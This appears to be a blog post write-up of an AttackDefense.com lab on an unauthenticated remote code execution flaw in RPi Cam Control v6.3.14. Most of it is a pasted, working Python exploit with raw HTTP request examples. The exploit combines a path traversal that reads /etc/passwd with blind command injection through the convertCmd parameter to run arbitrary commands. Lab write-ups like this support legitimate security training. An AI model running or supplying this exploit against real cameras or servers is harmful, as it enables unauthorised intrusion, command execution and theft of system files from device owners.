---
layout: post
title: AttackDefense.com [RCE] - RPi Cam Control
date: 2018-10-28 18:27 -0300
categories: [AttackDefense.com, ctf, writeups, RCE]
tags: [ writeups, CTF,  challange, AttackDefense.com]
---

![Image of AttackDefense 2018](/uploads/Screenshot from 2018-10-26 17-44-27.png)

### Mission

The attacker might not have any user level access to the web application. However, this does not mean that the application cannot be compromised remotely. Remote Code Execution vulnerabilities could be triggered even by unauthenticated users.

In the exercise below, the attacker is unauthenticated to the web application and needs to find a remote code injection attack to run arbitrary commands on the server.

A version of RPi Cam Control is vulnerable to a remote code execution attack.

Objective: Your task is to find and exploit this vulnerability.

Level difficulty: Easy

Category: Real World Webapps > Remote Code Execution

### Solution

On this challenge, I received unauthenticated access to a camera control interface presenting multiple actions buttons.

![Image of AttackDefense 2018](/uploads/Screenshot from 2018-10-28 23-31-29.png)

I decided to use @GetSploitBot for Telegram in order to obtain exploits for the application version ```RPi Cam Control v6.3.14```.

![Image of AttackDefense 2018](/uploads/Screenshot from 2018-10-28 23-34-28.png)

![Image of AttackDefense 2018](/uploads/Screenshot from 2018-10-28 23-37-17.png)

- I got the exploit code from [https://vulners.com/zdt/1337DAY-ID-28478](https://vulners.com/zdt/1337DAY-ID-28478)

```python
#####
# Exploit Title: RPi Cam Control <= v6.3.14 (RCE) Multiple Vulnerabilities - preview.php
# Date: 16/08/2017
# Exploit Author: Alexander Korznikov
# Vendor Homepage: https://github.com/silvanmelchior/RPi_Cam_Web_Interface
# Software Link: https://github.com/silvanmelchior/RPi_Cam_Web_Interface
# Version: <= v6.3.14
# Date 16/08/2017
#
# A web interface for the RPi Cam
# Vendor github: https://github.com/silvanmelchior/RPi_Cam_Web_Interface
#
# Bug Discovered by Alexander Korznikov:
#     www.exploit-db.com/author/?a=8722
#     www.linkedin.com/in/nopernik
#     www.korznikov.com
#
# RPi Cam Control <= v6.3.14 is vulnerable to Local File Read and Blind Command Injection.
#
#
# Local File Read (get /etc/passwd file):
# ----------------
# POST /preview.php HTTP/1.1
# Host: 127.0.0.1
# Content-Type: application/x-www-form-urlencoded
# Connection: close
# Content-Length: 80
#
# download1=../../../../../../../../../../../../../../../../etc/passwd.v0000.t
#
#
# Blind Command Injection:
# ------------------
# POST /preview.php HTTP/1.1
# Host: 127.0.0.1
# Content-Type: application/x-www-form-urlencoded
# Connection: close
# Content-Length: 52
#
# convert=none&convertCmd=$(COMMAND_TO_EXECUTE)
#
#
# Blind Command Injection can be used with Local File Read to properly get the output of injected command.
#
# Proof of Concept Code:
#####
 
#!/usr/bin/python
 
import requests
import sys
if not len(sys.argv[2:]):
   print "Usage: RPi-Cam-Control-RCE.py 127.0.0.1 'cat /etc/passwd'"
   exit(1)
 
def GET(target, rfile):
   res = requests.post("http://%s/preview.php" % target,
        headers={"Content-Type": "application/x-www-form-urlencoded", "Connection": "close"},
        data={"download1": "../../../../../../../../../../../../../../../../{}.v0000.t".format(rfile)})
   return res.content
 
def RCE(target, command):
   requests.post("http://%s/preview.php" % target,
        headers={"Content-Type": "application/x-www-form-urlencoded", "Connection": "close"},
        data={"convert": "none", "convertCmd": "$(%s > /tmp/output.txt)" % command})
   return GET(target,'/tmp/output.txt')
 
target = sys.argv[1]
command = sys.argv[2]
 
print RCE(target,command)

#  0day.today [2018-01-01]  #
```

Exploit usage example:

![Image of AttackDefense 2018](/uploads/Screenshot from 2018-10-28 23-42-52.png)

![Image of AttackDefense 2018](/uploads/Screenshot from 2018-10-28 23-43-16.png)

![Image of AttackDefense 2018](/uploads/Screenshot from 2018-10-29 23-53-43.png)
